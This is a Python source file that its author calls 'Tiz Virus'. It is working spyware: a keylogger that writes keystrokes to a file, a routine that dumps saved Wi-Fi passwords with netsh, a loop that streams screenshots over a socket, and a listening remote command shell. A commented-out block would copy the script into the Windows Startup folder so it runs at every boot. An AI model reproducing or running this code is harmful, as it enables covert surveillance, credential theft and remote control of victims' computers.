# -*- coding: utf-8 -*-
"""
Created on Dec 23 2020

@autor Tiz
"""

from logging import info
from pynput.keyboard import Key, Listener
from shutil import copyfile
import logging, threading, subprocess, socket, zlib, mss, argparse, sys

#copy the file in a place where it's gona be launched in every start # never tryed
"""import os
username = os.getlogin()
copyfile('virus.py', f'C:/Users/{username}/AppData/Roaming/Microsoft/Start Menu/Startup/Windaube.py')
"""
def parseargs():
    cli_args = argparse.ArgumentParser(description="Tiz Virus")
    cli_args.add_argument('--host',help="listening ip, no need to change", default='0.0.0.0', type=str)
    cli_args.add_argument('--port',help="stream port, reverse shell port = stream port +1", default=5000, type=int)
    cli_args.add_argument('--keylog',help="keylog=t create a keylogger file / keylog=f don\'t create the file", default="t", type=str)
    cli_args.add_argument('--wifi',help="wifi=t create a file with all wifis password / wifi=f don't create the file", default="t", type=str)
    options = cli_args.parse_args(sys.argv[1:])
    return options

def key_handler(key):
    logging.info(key)
def keylog():
    with Listener(on_press=key_handler) as listener:
        listener.join()
def wifipass():
    fichier = open("wifis.txt", "w")
    data = subprocess.check_output(['netsh','wlan', 'show' , 'profiles'], encoding="437").split('\n')
    wifis = [line.split(':')[1][1:] for line in data if (":" in line and line.split(':')[1] != ' ') ]
    for wifi in wifis:
        keys = subprocess.check_output(['netsh','wlan', 'show' , 'profile', wifi, 'key=clear'], encoding="437").split('\n')
        key = [line.split(':')[1][1:-1] for line in keys if ("Cont" in line)]
        try:
            fichier.write((str(wifi) + ":" + str(key[0])+"\n"))
        except IndexError:
            1
    fichier.close()
def retreive_screenshot(conn):
    """ Envoi des captures d'écran via un socket. """

    with mss.mss() as sct:
        # La région de l'écran à capturer
        rect = {'top': 0, 'left': 0, 'width': WIDTH, 'height': HEIGHT}

        while 'recording':
            # Prendre la capture d'écran
            img = sct.grab(rect)
            # Ajuster le niveau de compression ici (0-9)
            pixels = zlib.compress(img.rgb, 6)
            # Envoie de la taille de la taille des pixels
            size = len(pixels)
            size_len = (size.bit_length() + 7) // 8
            conn.send(bytes([size_len]))
            # Envoie de la taille des pixels
            size_bytes = size.to_bytes(size_len, 'big')
            conn.send(size_bytes)
            # Envoi des pixels compressés
            conn.sendall(pixels)
def screen_sender(host='0.0.0.0', port=5000):
    with socket.socket() as sock:
        sock.bind((host, port))
        sock.listen(5)
        print('Server started.')
        while 'connected':
            conn, addr = sock.accept()
            #print('Client connected IP:', addr)
            threadscreen2 = threading.Thread(target=retreive_screenshot, args=(conn,))
            threadscreen2.start()
def R_tcp(host='0.0.0.0', port=5001):
  s = socket.socket()
  BUFFER_SIZE = 1024
  s.bind((host, port))
  s.listen(5)
  print(f"Listening as {host}:{port} ...")
  client_socket, client_address = s.accept()
  print(f"{client_address[0]}:{client_address[1]} Connected!")
  message = "Hacked !".encode()
  client_socket.send(message)
  while True:
    # receive the command from the server
    command = client_socket.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        break
    output = subprocess.getoutput(command)
    client_socket.send(output.encode())
  client_socket.close()
  s.close()

if __name__ == "__main__":
    #parse args for socket connection
    options=parseargs()
    #keylogger
    if (options.keylog=="t"):
        logging.basicConfig(filename="Keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
        thread = threading.Thread(target=keylog)
        thread.start()
    #recup wifipass
    if (options.wifi=="t"):
        wifipass()
    #screen sender udp
    WIDTH = 1900
    HEIGHT = 1000
    threadscreen = threading.Thread(target=screen_sender,args=(options.host,options.port)) # port 5000
    threadscreen.start()
    #Reverse shell tcp 
    threadshell = threading.Thread(target=R_tcp,args=(options.host,options.port+1)) #port 5001
    threadshell.start()

    #suite
    print("hacked !")



    
